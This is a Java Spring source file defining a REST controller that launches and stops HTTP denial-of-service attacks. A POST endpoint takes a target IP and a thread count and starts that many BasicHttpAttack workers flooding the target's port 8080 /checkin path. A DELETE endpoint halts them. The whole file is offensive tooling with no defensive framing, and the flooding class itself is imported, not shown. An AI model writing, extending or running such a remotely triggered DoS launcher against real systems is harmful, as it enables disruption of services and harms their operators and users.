package tikal.controller;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import tikal.dos.Attack;
import tikal.dos.BasicHttpAttack;

@RestController
public class DoSController {
	
	Set<Attack> ongoingAttacks = new HashSet<Attack>(); 

	ExecutorService execService = Executors.newCachedThreadPool();
	
	@RequestMapping(value="/attack/{targetIP}/{threads}",method=RequestMethod.POST)
	public Object start(@PathVariable final int threads, @PathVariable final String targetIP){
		System.out.println(threads);
		System.out.println(targetIP);
		
		try {
			for (int i = 0; i < threads; i++) {
				Attack attack = new BasicHttpAttack();
				attack.setUrl("http://"+targetIP+":8080/checkin");
				ongoingAttacks.add(attack);
				execService.execute(attack);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		
		return true;
	}
	
	@RequestMapping(value="/attack",method=RequestMethod.DELETE)
	public Object stop(){
		for (Attack attack : ongoingAttacks) {
			attack.stop();
		}
		return true;
	}
}
